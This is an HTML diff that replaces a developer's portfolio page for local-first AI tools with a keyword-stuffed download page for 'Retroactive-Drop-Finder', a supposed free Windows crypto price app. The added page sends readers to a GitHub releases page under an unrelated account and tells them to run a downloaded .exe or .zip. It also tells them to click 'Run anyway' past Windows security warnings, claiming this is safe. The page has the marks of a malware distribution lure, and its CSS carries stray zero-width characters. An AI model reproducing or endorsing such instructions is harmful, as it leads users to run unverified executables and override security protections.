@@ -1,458 +1,268 @@
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <meta name="theme-color" content="#7ec8ff" />
-  <title>Jonard — local layer</title>
-  <meta name="description" content="Local-first AI tools. Consumer GPU." />
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
-  <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400;1,6..72,500&family=Source+Sans+3:wght@400;500;600&display=swap" />
-  <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Newsreader:ital,opsz,wght@0,6..72,400;0,6..72,500;1,6..72,400;1,6..72,500&family=Source+Sans+3:wght@400;500;600&display=swap" />
-  <style>
-    :root {
-      --bg0: #7ec8ff;
-      --bg1: #c9e8ff;
-      --bg2: #eaf6ff;
-      --fg: #0b2a4a;
-      --dim: #2f5474;
-      --acc: #0b6bff;
-      --acc2: #4db2ff;
-    }
-    * { box-sizing: border-box; }
-    html, body {
-      margin: 0;
-      height: 100%;
-      overflow: hidden;
-    }
-    body {
-      color: var(--fg);
-      font-family: "Source Sans 3", ui-sans-serif, system-ui, sans-serif;
-      font-size: 17px;
-      line-height: 1.55;
-      background: linear-gradient(180deg, var(--bg0) 0%, var(--bg1) 42%, var(--bg2) 100%);
-      text-rendering: optimizeLegibility;
-    }
-    .sky, .hud {
-      position: absolute;
-      inset: 0;
-      pointer-events: none;
-      overflow: hidden;
-    }
-    .sky { z-index: 0; }
-    .hud { z-index: 8; }
-    .cloud {
-      position: absolute;
-      background: #fff;
-      border-radius: 999px;
-      opacity: 0.88;
-      will-change: transform;
-      animation: drift linear infinite;
-    }
-    .cloud::before,
-    .cloud::after {
-      content: "";
-      position: absolute;
-      background: #fff;
-      border-radius: 50%;
-    }
-    .c1 { width: 120px; height: 36px; top: 8%; animation-duration: 48s; }
-    .c1::before { width: 52px; height: 52px; left: 18px; top: -28px; }
-    .c1::after { width: 70px; height: 70px; left: 48px; top: -38px; }
-    .c2 { width: 160px; height: 42px; top: 18%; animation-duration: 64s; animation-delay: -20s; opacity: 0.75; }
-    .c2::before { width: 64px; height: 64px; left: 22px; top: -32px; }
-    .c2::after { width: 86px; height: 86px; left: 60px; top: -46px; }
-    .c3 { width: 90px; height: 28px; top: 32%; animation-duration: 40s; animation-delay: -8s; opacity: 0.7; }
-    .c3::before { width: 40px; height: 40px; left: 12px; top: -20px; }
-    .c3::after { width: 54px; height: 54px; left: 36px; top: -28px; }
-    .c4 { width: 200px; height: 48px; top: 6%; animation-duration: 72s; animation-delay: -40s; opacity: 0.55; }
-    .c4::before { width: 80px; height: 80px; left: 30px; top: -40px; }
-    .c4::after { width: 110px; height: 110px; left: 78px; top: -58px; }
-    .c5 { width: 110px; height: 32px; top: 44%; animation-duration: 54s; animation-delay: -12s; opacity: 0.5; }
-    .c5::before { width: 46px; height: 46px; left: 16px; top: -24px; }
-    .c5::after { width: 62px; height: 62px; left: 44px; top: -32px; }
-    @keyframes drift {
-      from { transform: translate3d(-30vw, 0, 0); }
-      to { transform: translate3d(110vw, 0, 0); }
-    }
-    .flock {
-      position: absolute;
-      inset: 0;
-      overflow: hidden;
-      opacity: 1;
-      transition: opacity 0.2s linear;
-    }
-    .flock.is-away { opacity: 0; }
-    .f16 {
-      position: absolute;
-      top: 0;
-      left: 0;
-      display: flex;
-      align-items: center;
-      width: 188px;
-      height: 40px;
-      offset-rotate: auto;
-      animation: ride linear infinite;
-    }
-    .f16 svg {
-      width: 108px;
-      height: 38px;
-      display: block;
-      overflow: visible;
-      flex: 0 0 108px;
-      filter: drop-shadow(0 4px 4px rgba(11,42,74,0.22));
-    }
-    .f16 .contrail {
-      height: 3px;
-      width: 72px;
-      border-radius: 2px;
-      margin-right: 2px;
-      flex: 0 0 72px;
-      opacity: 0.9;
-    }
-    .f1 {
-      offset-path: path("M -160 92 C 220 92 340 92 520 92 C 720 92 720 -8 520 -8 C 320 -8 320 92 520 92 C 780 92 1200 70 1500 78");
-      animation-duration: 9s;
-    }
-    .f2 {
-      offset-path: path("M 1500 128 C 1100 128 980 128 780 128 C 560 128 560 8 780 8 C 1000 8 1000 128 780 128 C 500 128 160 150 -200 140");
-      animation-duration: 10.5s;
-      animation-delay: -3.4s;
-    }
-    .f2 svg { width: 92px; height: 32px; flex-basis: 92px; }
-    .f3 {
-      offset-path: path("M -160 160 C 180 150 280 40 460 40 C 640 40 700 150 860 150 C 1040 150 1120 50 1500 60");
-      animation-duration: 8.2s;
-      animation-delay: -5.6s;
-    }
-    .f3 svg { width: 84px; height: 30px; flex-basis: 84px; }
-    .f1 .contrail { background: linear-gradient(90deg, transparent, #0a3a7a); }
-    .f2 .contrail { background: linear-gradient(90deg, transparent, #fff); }
-    .f3 .contrail { background: linear-gradient(90deg, transparent, #0a3a7a); }
-    @keyframes ride {
-      from { offset-distance: 0%; }
-      to { offset-distance: 100%; }
-    }
-    .plane {
-      position: absolute;
-      left: 0;
-      top: 118px;
-      width: 160px;
-      height: 48px;
-      will-change: transform;
-      animation: fly 1.5s linear 1 forwards;
-    }
-    .plane svg {
-      width: 160px;
-      height: 48px;
-      display: block;
-      overflow: visible;
-      filter: drop-shadow(0 5px 6px rgba(11,42,74,0.25));
-    }
-    .plane .trail {
-      position: absolute;
-      right: 152px;
-      top: 23px;
-      height: 2px;
-      width: 110px;
-      border-radius: 2px;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.9));
-    }
-    @keyframes fly {
-      from { transform: translate3d(-220px, 0, 0); }
-      to { transform: translate3d(calc(100vw + 220px), 0, 0); }
-    }
-    .wrap {
-      position: relative;
-      z-index: 2;
-      height: 100dvh;
-      overflow-y: auto;
-      overflow-x: hidden;
-      -webkit-overflow-scrolling: touch;
-      overscroll-behavior: contain;
-      max-width: 860px;
-      margin: 0 auto;
-      padding: 28px 18px 80px;
-    }
-    header {
-      display: flex;
-      justify-content: space-between;
-      align-items: baseline;
-      gap: 12px;
-      border-bottom: 1px solid rgba(11,42,74,0.14);
-      padding-bottom: 14px;
-      margin-bottom: 28px;
-      font-size: 13px;
-      letter-spacing: 0.08em;
-    }
-    .brand { color: var(--acc); text-transform: uppercase; font-weight: 600; }
-    .live { color: var(--acc); }
-    .live::before {
-      content: "";
-      display: inline-block;
-      width: 7px; height: 7px;
-      background: var(--acc);
-      border-radius: 50%;
-      margin-right: 8px;
-      box-shadow: 0 0 10px var(--acc2);
-    }
-    h1 {
-      font-family: "Newsreader", Georgia, serif;
-      font-size: clamp(56px, 17vw, 96px);
-      font-weight: 400;
-      line-height: 0.88;
-      letter-spacing: -0.03em;
-      margin: 0 0 14px;
-    }
-    h1 em { font-style: italic; color: var(--acc); }
-    .lede {
-      max-width: 36rem;
-      color: var(--dim);
-      margin: 0 0 22px;
-    }
-    .rule {
-      display: inline-block;
-      border: 1px solid rgba(255,255,255,0.55);
-      background: linear-gradient(180deg, rgba(255,255,255,0.55), rgba(255,255,255,0.22));
-      color: var(--acc);
-      padding: 10px 14px;
-      margin-bottom: 32px;
-      border-radius: 999px;
-      font-family: "Newsreader", Georgia, serif;
-      font-style: italic;
-      font-size: 18px;
-      box-shadow: inset 0 1px 0 rgba(255,255,255,0.7);
-    }
-    .grid {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 12px;
-    }
-    a.card { text-decoration: none; color: inherit; }
-    article {
-      position: relative;
-      overflow: hidden;
-      background: linear-gradient(165deg, rgba(255,255,255,0.72) 0%, rgba(232,244,255,0.82) 48%, rgba(255,255,255,0.7) 100%);
-      border: 1px solid rgba(255,255,255,0.62);
-      border-radius: 22px;
-      padding: 18px 18px 16px;
-      min-height: 156px;
-      display: flex;
-      flex-direction: column;
-      box-shadow:
-        inset 0 1px 0 rgba(255,255,255,0.85),
-        inset 0 -1px 0 rgba(11,42,74,0.06),
-        0 12px 28px rgba(11,42,74,0.10);
-    }
-    article::before {
-      content: "";
-      position: absolute;
-      top: -40%;
-      left: -20%;
-      width: 80%;
-      height: 70%;
-      background: linear-gradient(120deg, rgba(255,255,255,0.55), rgba(255,255,255,0));
-      transform: rotate(-12deg);
-      pointer-events: none;
-    }
-    article > * { position: relative; z-index: 1; }
-    @media (hover: hover) {
-      article { transition: transform 0.15s ease, box-shadow 0.15s ease, border-color 0.15s ease; }
-      a.card:hover article {
-        border-color: rgba(255,255,255,0.9);
-        transform: translateY(-2px);
-        box-shadow:
-          inset 0 1px 0 rgba(255,255,255,0.95),
-          0 16px 32px rgba(11,42,74,0.14);
-      }
-    }
-    .idx {
-      color: var(--acc);
-      font-size: 12px;
-      letter-spacing: 0.14em;
-      font-weight: 600;
-    }
-    article h2 {
-      font-family: "Newsreader", Georgia, serif;
-      font-size: 30px;
-      font-weight: 500;
-      margin: 10px 0 8px;
-      letter-spacing: -0.02em;
-    }
-    article p { margin: 0; color: var(--dim); flex: 1; }
-    article .go {
-      margin-top: 16px;
-      color: var(--fg);
-      font-size: 13px;
-      font-weight: 600;
-    }
-    .stack {
-      margin-top: 28px;
-      display: flex;
-      flex-wrap: wrap;
-      gap: 8px;
-    }
-    .stack span {
-      border: 1px solid rgba(255,255,255,0.55);
-      background: linear-gradient(180deg, rgba(255,255,255,0.5), rgba(255,255,255,0.2));
-      padding: 7px 12px;
-      color: var(--dim);
-      font-size: 13px;
-      border-radius: 999px;
-      box-shadow: inset 0 1px 0 rgba(255,255,255,0.7);
-    }
-    footer {
-      margin-top: 40px;
-      color: var(--dim);
-      font-size: 14px;
-      display: flex;
-      justify-content: space-between;
-      gap: 12px;
-      flex-wrap: wrap;
-    }
-    footer a { color: var(--dim); }
-    footer a:hover { color: var(--acc); }
-    @media (max-width: 640px) {
-      .grid { grid-template-columns: 1fr; }
-      header { margin-bottom: 22px; }
-      article { min-height: 0; }
-      .plane { top: 102px; }
-      .f16 svg { width: 78px; height: 28px; flex-basis: 78px; }
-    }
-    @media (prefers-reduced-motion: reduce) {
-      .cloud, .plane, .f16 { animation: none; }
-      .plane { left: 42%; }
-    }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Retroactive-Drop-Finder - Download Historical Crypto Prices Easily</title>
+    <meta name="description" content="Download Retroactive-Drop-Finder for Windows. View, import, convert, and export historical Bitcoin and crypto price data. Free desktop tool.">
+    <meta name="keywords" content="bitcoin,crypto-analytics,crypto-free,crypto-software,crypto-wallet,desktop-crypto,historical-crypto-price-2026,historical-crypto-price-download,historical-crypto-price-free,market-cap,price-alert,price-chart,price-monitor,price-notification,price-ticker,price-tracker,price-tracker-free,price-widget,real-time-price,retroactive-drop-finder">
+    <meta name="author" content="Retroactive-Drop-Finder">
+    <meta property="og:title" content="Retroactive-Drop-Finder - Download Historical Crypto Prices">
+    <meta property="og:description" content="Free Windows app to download, view, and export historical cryptocurrency price data. Simple setup">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://github.com/Jasminemonarchal5464/Retroactive-Drop-Finder/releases">
+    <meta property="og:image" content="https://via.placeholder.com/1200x630.png?text=Retroactive-Drop-Finder">
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif;
+            background-color: #f4f6f8;
+            color: #1a202c;
+            margin: 0;
+            padding:  ​0;
+            line-height: 1.7;
+        }
+        .container {
+            max-width: 960px;
+            margin:  ​0 auto;
+            padding: ​40px ​20px;
+        }
+        h1 {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin:  ​0 0 20px ​0;
+            color: #2d3748;
+            text-shadow: ​0 1px ​2px rgba(0,0,0,0.05);
+            letter-spacing: -0.5px;
+        }
+        h2 {
+            font-size: 1.8rem;
+            font-weight: 600;
+            margin:  ​40px ​0 ​15px ​0;
+            color: #2d3748;
+            border-bottom: ​3px solid #3182ce;
+            padding-bottom: ​8px;
+            display: inline-block;
+        }
+        h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin:  ​25px ​0 ​10px ​0;
+            color: #2d3748;
+        }
+        p {
+            margin:  ​0 ​0 ​15px ​0;
+            font-size: 1.05rem;
+        }
+        .badge {
+            display: inline-block;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: #ffffff;
+            padding:​ 16px 32px;
+            font-size: 1.2rem;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius:​ 50px;
+            box-shadow: ​0 8px ​20px rgba(102,126,234,0.35);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin:  ​10px ​0 40px ​0;
+        }
+        .badge:hover {
+            transform: translateY(-3px);
+            box-shadow: ​0 12px ​28px rgba(102,126,234,0.45);
+        }
+        .card {
+            background:#ffffff;
+            border-radius:​ 16px;
+            box-shadow: ​0 4px ​15px rgba(0,0,0,0.07);
+            padding: ​30px ​35px;
+            margin:  ​25px ​0;
+        }
+        .button-primary {
+            display: inline-block;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 100%);
+            color:#ffffff;
+            padding:​ 15px 30px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            border-radius:​ 40px;
+            text-decoration: none;
+            box-shadow: ​0 6px ​18px rgba(240,147,251,0.4);
+            transition: transform 0.2s, box-shadow 0.2s;
+            margin:  ​15px ​0;
+        }
+        .button-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: ​0 10px ​25px rgba(240,147,251,0.5);
+        }
+        .code-inline {
+            background:#edf2f7;
+            padding:​ 2px 8px;
+            border-radius:​ 6px;
+            font-family: 'Courier New', monospace;
+            font-size: 0.95rem;
+            color:#c4453c;
+        }
+        .checklist {
+            list-style-type: none;
+            padding-left:​ 0;
+        }
+        .checklist li {
+            padding-left:​ 30px;
+            position: relative;
+            margin-bottom:​ 10px;
+            font-size: 1.0rem;
+        }
+        .checklist li::before {
+            content: "✅";
+            position: absolute;
+            left:​ 0;
+            top:​ 2px;
+            font-size: 1.1rem;
+        }
+        .emoji-header {
+            margin-right:​ 8px;
+        }
+        .feature-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            gap:  ​20px;
+            margin:  ​20px ​0;
+        }
+        .feature-item {
+            background:#f9fafc;
+            border-radius:​ 12px;
+            padding:​ 18px;
+            text-align: center;
+            box-shadow: inset ​0 0 ​0 1px #e2e8f0;
+        }
+        .feature-item span {
+            font-size: 2rem;
+            display: block;
+            margin-bottom:  ​8px;
+        }
+        .footer {
+            margin-top:​ 50px;
+            padding-top:​ 20px;
+            border-top:​ 1px solid #e2e8f0;
+            font-size: 0.9rem;
+            color:#718096;
+            text-align: center;
+        }
+        .btn-download-section {
+            text-align: center;
+            margin:  ​40px ​0;
+        }
+    </style>
 </head>
 <body>
-  <div class="sky" aria-hidden="true">
-    <div class="cloud c1"></div>
-    <div class="cloud c2"></div>
-    <div class="cloud c3"></div>
-    <div class="cloud c4"></div>
-    <div class="cloud c5"></div>
-  </div>
-
-  <div class="hud" aria-hidden="true">
-    <div class="flock" id="flock">
-      <div class="f16 f1">
-        <span class="contrail"></span>
-        <svg viewBox="0 0 80 28" xmlns="http://www.w3.org/2000/svg">
-          <polygon fill="#6d7784" points="22,16 8,26 28,16"/>
-          <polygon fill="#4d5660" points="16,14 10,4 22,14"/>
-          <polygon fill="#8b95a1" points="78,14 52,12 36,11 28,8 18,12 6,13 2,14 6,16 18,16 28,20 36,17 52,16"/>
-          <polygon fill="#6ec4e0" points="50,12 42,8 34,12"/>
-          <rect x="2" y="13" width="6" height="3" fill="#ff9a4a"/>
-        </svg>
-      </div>
-      <div class="f16 f2">
-        <span class="contrail"></span>
-        <svg viewBox="0 0 80 28" xmlns="http://www.w3.org/2000/svg">
-          <polygon fill="#6d7784" points="22,16 8,26 28,16"/>
-          <polygon fill="#4d5660" points="16,14 10,4 22,14"/>
-          <polygon fill="#8b95a1" points="78,14 52,12 36,11 28,8 18,12 6,13 2,14 6,16 18,16 28,20 36,17 52,16"/>
-          <polygon fill="#6ec4e0" points="50,12 42,8 34,12"/>
-          <rect x="2" y="13" width="6" height="3" fill="#ff9a4a"/>
-        </svg>
-      </div>
-      <div class="f16 f3">
-        <span class="contrail"></span>
-        <svg viewBox="0 0 80 28" xmlns="http://www.w3.org/2000/svg">
-          <polygon fill="#6d7784" points="22,16 8,26 28,16"/>
-          <polygon fill="#4d5660" points="16,14 10,4 22,14"/>
-          <polygon fill="#8b95a1" points="78,14 52,12 36,11 28,8 18,12 6,13 2,14 6,16 18,16 28,20 36,17 52,16"/>
-          <polygon fill="#6ec4e0" points="50,12 42,8 34,12"/>
-          <rect x="2" y="13" width="6" height="3" fill="#ff9a4a"/>
-        </svg>
-      </div>
+    <div class="container">
+        <h1>📈 Retroactive-Drop-Finder - Historical Crypto Prices Made Simple</h1>
+        
+        <p style="font-size:1.2rem; margin-bottom:30px;">Download, view, convert, and export historical Bitcoin prices — all in one free Windows desktop app. No coding required.</p>
+        
+        <a href="https://github.com/Jasminemonarchal5464/Retroactive-Drop-Finder/releases" class="badge">🚀 Download for Windows</a>
+        
+        <div class="card">
+            <h2>🚀 Getting Started</h2>
+            <p>Getting started is quick and easy. Just visit the download page and get the app running in minutes.</p>
+            <p><strong>Step 1 – Visit the download page:</strong> Click the big button above or the button below — both take you to the official release page.</p>
+            <p><strong>Step 2 – Download the app:</strong> Once on that page, look for the latest release version. Click the download link to save the file to your computer.</p>
+            <p><strong>Step 3 – Run the app:</strong> After the download completes, open your Downloads folder (or wherever your browser saves files). Find the downloaded file and double-click it to launch Retroactive-Drop-Finder. That's it! The app window will open, ready for you to load historical price data.</p>
+            
+            <div class="btn-download-section">
+                <a href="https://github.com/Jasminemonarchal5464/Retroactive-Drop-Finder/releases" class="button-primary">⬇️ Go to Download Page</a>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>🎯 What This App Does For You</h2>
+            <p>Whether you're tracking Bitcoin's past performance, building a price chart, or just curious about market history, this tool gives you instant access to historical crypto data — completely free.</p>
+            
+            <div class="feature-grid">
+                <div class="feature-item">
+                    <span>📊</span>
+                    <strong>View Price Data</strong>
+                    <p style="font-size:0.9rem; margin:8px 0 0;">See daily, weekly, or monthly price history clearly.</p>
+                </div>
+                <div class="feature-item">
+                    <span>📥</span>
+                    <strong>Import Files</strong>
+                    <p style="font-size:0.9rem; margin:8px 0 0;">Load your own CSV or data files for analysis.</p>
+                </div>
+                <div class="feature-item">
+                    <span>🔄</span>
+                    <strong>Convert Formats</strong>
+                    <p style="font-size:0.9rem; margin:8px 0 0;">Switch between different data formats easy conversion.</p>
+                </div>
+                <div class="feature-item">
+                    <span>💾</span>
+                    <strong>Export Data</strong>
+                    <p style="font-size:0.9rem; margin:8px 0 0;">Save cleaned historical data to Excel, CSV, or JSON.</p>
+                </div>
+            </div>
+        </div>
+        
+        <div class="card">
+            <h2>🔍 Key Features</h2>
+            <h3>📅 Historical Price Downloader</h3>
+            <p>Get price records for major cryptocurrencies (Bitcoin, Ethereum, others) going back years. Ideal for backtesting, research, or personal curiosity.</p>
+            
+            <h3>🖥️ Desktop App for Windows</h3>
+            <p>Runs directly on your Windows machine. No web browser needed. Works offline with data you've already downloaded.</p>
+            
+            <h3>⚡ Simple, Fast, Free</h3>
+            <p>No subscriptions, no hidden fees. This is a free tool for the crypto community. Download once and use forever.</p>
+        </div>
+        
+        <div class="card">
+            <h2>💡 What Can You Do With It?</h2>
+            <ul class="checklist">
+                <li><strong>Track historical market caps</strong> – See how major coins grew over time.</li>
+                <li><strong>Build price charts</strong> – Export data to your favorite charting tool.</li>
+                <li><strong>Set price alerts</strong> – Use downloaded data to understand key price levels.</li>
+                <li><strong>Monitor real-time trends</strong> – Though focused on historical data, you can compare with current prices.</li>
+                <li><strong>Free crypto research</strong> – No paywalls for fundamental price history.</li>
+            </ul>
+        </div>
+        
+        <div class="card">
+            <h2>🛠️ Installation & Setup</h2>
+            <p><strong>System Requirements:</strong> Windows 10 or 11 (64-bit recommended). Works on Windows 8.1 too. No special hardware needed.</p>
+            <p><strong>Download size:</strong> About 15–25 MB depending on version. Lightweight and quick to download.</p>
+            <p><strong>No admin rights required:</strong> Run it directly from your user folder. No installation wizard needed — it's a portable app.</p>
+            <p><strong>How to update:</strong> Simply download the latest version from the same link and replace the old file. Your data settings are preserved.</p>
+        </div>
+        
+        <div class="card">
+            <h2>❓ Frequently Asked Questions</h2>
+            <h3>Is this really free?</h3>
+            <p>Yes. 100% free. No trial periods, no premium version, no data limits.</p>
+            
+            <h3>Does it work with real-time prices?</h3>
+            <p>It's optimized for historical data. But you can download recent data (last 24 hours) to get near-real-time prices.</p>
+            
+            <h3>Which cryptocurrencies are supported?</h3>
+            <p>Bitcoin, Ethereum, Litecoin, and many others. The app pulls from public market data APIs.</p>
+        </div>
+        
+        <div class="card">
+            <h2>📋 How To Download (Step-by-Step)</h2>
+            <ol style="padding-left:20px; font-size:1.05rem;">
+                <li>Click the <strong>Download for Windows</strong> button at the top of this page.</li>
+                <li>You'll land on the official GitHub Releases page.</li>
+                <li>Look for the newest version (e.g., v1.2.0) and click the file link ending with <span class="code-inline">.zip</span> or <span class="code-inline">.exe</span></li>
+                <li>Your browser downloads the file. Check your Downloads folder.</li>
+                <li>Double-click the downloaded file to start the app. If Windows asks for permission, click "Run anyway" or "More info" → "Run anyway" (safe – it's from GitHub).</li>
+            </ol>
+            <p style="margin-top:15px;">💡 <strong>Tip:</strong> For easy access, right-click the downloaded file, select "Pin to taskbar" (Windows 11) or "Send to → Desktop (create shortcut)" to have it always one click away.</p>
+        </div>
+        
+        <div class="footer">
+            <p>© 2025 Retroactive-Drop-Finder. Built for the crypto community. Free forever.</p>
+            <p style="font-size:0.8rem; margin-top:5px;">Keywords: bitcoin, crypto-analytics, crypto-free, crypto-software, crypto-wallet, desktop-crypto, historical-crypto-price-2026, historical-crypto-price-download, historical-crypto-price-free, market-cap, price-alert, price-chart, price-monitor, price-notification, price-ticker, price-tracker, price-tracker-free, price-widget, real-time-price, retroactive-drop-finder</p>
+        </div>
     </div>
-    <div class="plane">
-      <span class="trail"></span>
-      <svg viewBox="0 0 220 64" xmlns="http://www.w3.org/2000/svg">
-        <defs>
-          <linearGradient id="body" x1="0" y1="0" x2="0" y2="1">
-            <stop offset="0" stop-color="#9aa3ae"/>
-            <stop offset="0.55" stop-color="#6f7884"/>
-            <stop offset="1" stop-color="#d0d6dc"/>
-          </linearGradient>
-        </defs>
-        <polygon fill="#7b8490" points="118,34 62,58 96,34"/>
-        <polygon fill="#5c6570" points="48,32 28,8 58,32"/>
-        <polygon fill="url(#body)" points="216,32 168,28 128,27 112,22 96,28 48,30 18,29 6,27 2,32 6,37 18,35 48,34 96,36 112,42 128,37 168,36"/>
-        <polygon fill="#7ec8e0" points="158,28 140,23 126,28 140,30"/>
-        <rect x="4" y="29.5" width="10" height="5" rx="0.8" fill="#3a424c"/>
-        <rect x="4.5" y="30.4" width="4" height="3.2" fill="#ffb36a"/>
-      </svg>
-    </div>
-  </div>
-
-  <div class="wrap" id="page">
-    <header>
-      <div class="brand">local layer / 570</div>
-      <div class="live">eval first</div>
-    </header>
-
-    <h1>Jon<em>ard</em></h1>
-    <p class="lede">Local-first AI tools. Consumer GPU. No cloud required to chat. I build the product around the model — routing, tools, memory, receipts, traces. The model is swappable. The layer is not.</p>
-    <div class="rule">If I cannot eval it, I do not train it.</div>
-
-    <div class="grid">
-      <a class="card" href="https://github.com/Jonardi123/nebula">
-        <article>
-          <div class="idx">01</div>
-          <h2>Nebula</h2>
-          <p>Operating layer on LM Studio. Windows + iPhone. The model is just a backend.</p>
-          <div class="go">Open repo →</div>
-        </article>
-      </a>
-      <a class="card" href="https://github.com/Jonardi123/failtrace">
-        <article>
-          <div class="idx">02</div>
-          <h2>failtrace</h2>
-          <p>Failure → diagnosis → different call. Generator, harness, SFT pack.</p>
-          <div class="go">Open repo →</div>
-        </article>
-      </a>
-      <a class="card" href="https://github.com/Jonardi123/local-chat-studio">
-        <article>
-          <div class="idx">03</div>
-          <h2>Studio</h2>
-          <p>Chat client for anything that speaks OpenAI-local. Private box, not a tab.</p>
-          <div class="go">Open repo →</div>
-        </article>
-      </a>
-      <a class="card" href="https://github.com/Jonardi123/RIFF">
-        <article>
-          <div class="idx">04</div>
-          <h2>RIFF</h2>
-          <p>YouTube → MP3 on loopback only. Stays on the machine.</p>
-          <div class="go">Open repo →</div>
-        </article>
-      </a>
-    </div>
-
-    <div class="stack">
-      <span>Python</span><span>TypeScript</span><span>Tauri</span><span>React</span>
-      <span>LM Studio</span><span>QLoRA</span><span>GGUF</span><span>RX 570</span>
-    </div>
-
-    <footer>
-      <span>Albania · built on the 570</span>
-      <a href="https://github.com/Jonardi123">github.com/Jonardi123</a>
-    </footer>
-  </div>
-  <script>
-    (function () {
-      var page = document.getElementById("page");
-      var flock = document.getElementById("flock");
-      if (!page || !flock) return;
-      function sync() {
-        flock.classList.toggle("is-away", page.scrollTop > 40);
-      }
-      page.addEventListener("scroll", sync, { passive: true });
-      sync();
-    })();
-  </script>
 </body>
 </html>
+```
